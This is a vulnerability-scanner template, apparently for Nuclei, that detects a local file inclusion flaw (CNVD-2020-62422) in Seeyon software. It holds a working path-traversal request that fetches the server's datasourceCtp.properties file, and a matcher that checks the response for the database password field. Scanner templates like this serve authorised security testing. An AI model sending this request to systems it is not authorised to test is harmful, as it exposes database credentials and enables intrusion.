id: CNVD-2020-62422

info:
  name: Seeyon - Local File Inclusion
  author: pikpikcu
  severity: medium
  description: Seeyon is vulnerable to local file inclusion.
  reference:
    - https://blog.csdn.net/m0_46257936/article/details/113150699
  classification:
    cpe: cpe:2.3:a:seeyon:seeyon:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: seeyon
    product: seeyon
  tags: cnvd,cnvd2020,lfi,seeyon,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        name: seeyon
        cpe: cpe:2.3:a:seeyon:seeyon:*:*:*:*:*:*:*:*
        part: header
        words:
          - "application/x-msdownload"
        condition: and

      - type: word
        name: seeyon-2
        cpe: cpe:2.3:a:seeyon:seeyon:*:*:*:*:*:*:*:*
        part: body
        words:
          - "ctpDataSource.password"
        condition: and
